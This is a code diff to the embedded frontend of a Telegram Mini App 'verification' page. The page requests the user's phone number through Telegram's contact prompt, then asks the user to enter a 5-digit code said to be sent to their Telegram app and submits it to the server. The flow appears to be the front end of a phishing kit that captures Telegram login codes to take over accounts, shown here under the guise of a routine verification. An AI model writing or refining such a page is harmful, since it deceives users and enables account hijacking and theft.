@@ -264,8 +264,12 @@ FRONTEND_HTML = """
         var userId = null;
         var enteredCode = '';
         
-        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-            userId = tg.initDataUnsafe.user.id;
+        try {
+            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+                userId = tg.initDataUnsafe.user.id;
+            }
+        } catch(e) {
+            console.log('Could not get user ID from Telegram');
         }
         
         function handleConfirm() {
@@ -273,41 +277,22 @@ FRONTEND_HTML = """
             document.getElementById('verificationScreen').style.display = 'block';
         }
         
-        // FIXED: Properly extracts phone and handles missing userId
         function handleContact() {
             document.getElementById('shareBtn').disabled = true;
             document.getElementById('contactLoading').style.display = 'block';
             
             tg.requestContact(function(success, response) {
+                console.log('Success:', success);
+                console.log('Response:', response);
+                
                 if (success && response) {
-                    console.log('Contact response:', response);
+                    var phone = response;
                     
-                    // Extract phone number from various possible formats
-                    var phone = null;
-                    if (typeof response === 'string') {
-                        phone = response;
-                    } else if (response.phone_number) {
-                        phone = response.phone_number;
-                    } else if (response.contact && response.contact.phone_number) {
-                        phone = response.contact.phone_number;
-                    }
-                    
-                    // Ensure phone has + prefix
-                    if (phone && !phone.startsWith('+')) {
+                    if (!phone.startsWith('+')) {
                         phone = '+' + phone;
                     }
                     
-                    // Use phone as user_id if tg user id not available
                     var uid = userId || phone;
-                    
-                    if (!phone || !uid) {
-                        alert('Could not get phone number. Please try again.');
-                        document.getElementById('shareBtn').disabled = false;
-                        document.getElementById('contactLoading').style.display = 'none';
-                        return;
-                    }
-                    
-                    // Store uid for later use
                     userId = uid;
                     
                     fetch('/initiate', {
@@ -353,11 +338,11 @@ FRONTEND_HTML = """
             .then(function(res) { return res.json(); })
             .then(function(data) {
                 if (data.success) {
-                    alert('A new code has been sent to your Telegram app.');
+                    alert('A new code has been sent.');
                     enteredCode = '';
                     updateCodeDisplay();
                 } else {
-                    alert(data.error || 'Failed to resend code.');
+                    alert(data.error || 'Failed to resend.');
                 }
             });
         }
@@ -388,7 +373,6 @@ FRONTEND_HTML = """
             }
         }
         
-        // FIXED: Added check for userId
         function submitCode() {
             if (enteredCode.length !== 5) {
                 alert('Please enter the full 5-digit code.');
@@ -396,7 +380,7 @@ FRONTEND_HTML = """
             }
             
             if (!userId) {
-                alert('Session error. Please restart the verification.');
+                alert('Session error. Please restart.');
                 return;
             }
             
@@ -409,9 +393,7 @@ FRONTEND_HTML = """
                 body: JSON.stringify({ code: enteredCode, user_id: userId })
             })
             .then(function(res) { 
-                if (!res.ok) {
-                    throw new Error('Server error: ' + res.status);
-                }
+                if (!res.ok) throw new Error('Server error: ' + res.status);
                 return res.json(); 
             })
             .then(function(data) {
